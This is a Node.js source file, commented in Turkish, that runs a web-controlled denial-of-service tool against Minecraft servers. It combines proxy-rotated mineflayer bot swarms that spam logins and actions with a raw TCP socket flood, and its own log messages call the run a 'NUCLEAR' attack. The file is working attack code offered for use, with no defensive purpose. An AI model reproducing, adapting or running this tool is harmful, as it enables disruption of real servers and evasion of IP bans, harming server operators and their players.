const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const net = require('net');
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// 🛡️ VIP PROXY HAVUZU (IP Ban Yememek Şart!)
const proxyList = ["socks5://ip:port", "http://ip:port"]; 

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[NUCLEAR] Attack initiated against ${host}:${port}`);

    for (let i = 0; i < Math.min(count, 500); i++) {
        // ⏱️ SANİYE BAŞI 2 "GİRİŞ" (500ms Gecikme)
        setTimeout(() => {
            // 1. L7 SALDIRISI (Görünür Botlar)
            launchBot(host, port, i);
            
            // 2. L4 SALDIRISI (Görünmez Paket Fırtınası)
            launchL4Flood(host, port);
        }, i * 500); 
    }
    res.json({ success: true, message: "DDoS Machine is running. Server bypass in progress..." });
});

// --- L7 BOT MODÜLÜ ---
function launchBot(host, port, index) {
    const currentProxy = proxyList[index % proxyList.length];
    if (!currentProxy) return;

    const bot = mineflayer.createBot({
        host: host, port: port,
        username: `Vip_Storm_${Math.floor(Math.random() * 999999)}`,
        agent: new ProxyAgent(currentProxy),
        hideErrors: true, skipValidation: true
    });

    bot.on('spawn', () => {
        bot.chat(`/register resul3163 resul3163`);
        bot.chat(`/login resul3163`);
        
        // Sunucu Fiziğini Yor (L7 Stress)
        setInterval(() => {
            if(bot.entity) {
                bot.look(Math.random() * 360, 0);
                bot.swingArm('right');
                bot.setControlState('jump', true);
            }
        }, 10);
    });

    bot.on('end', () => setTimeout(() => launchBot(host, port, index), 2000));
}

// --- L4 NETWORK FLOOD ---
function launchL4Flood(host, port) {
    const socket = new net.Socket();
    socket.connect(port, host, () => {
        // Ham veri göndererek bant genişliğini bitirir
        setInterval(() => {
            if(!socket.destroyed) {
                socket.write(Buffer.alloc(1024, Math.random().toString(36)));
            }
        }, 1);
    });
    socket.on('error', () => socket.destroy());
}

app.listen(process.env.PORT || 3000);
